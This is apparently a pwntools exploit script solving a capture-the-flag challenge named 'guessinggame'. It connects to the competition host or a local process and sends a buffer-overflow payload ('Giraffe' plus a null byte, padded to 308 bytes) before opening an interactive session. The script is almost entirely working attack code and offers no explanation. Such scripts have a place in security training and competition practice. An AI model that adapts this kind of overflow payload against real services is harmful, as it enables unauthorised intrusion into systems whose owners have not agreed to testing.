#!/usr/bin/python3

from pwn import *

exe = ELF('guessinggame', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x00005555555552ec

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chal.pctf.competitivecyber.club', 9999)
else:
        p = process(exe.path)

GDB()
payload = b'Giraffe\0'
payload = payload.ljust(308, b'1')
sla(b"animal?\n", payload)
p.interactive()
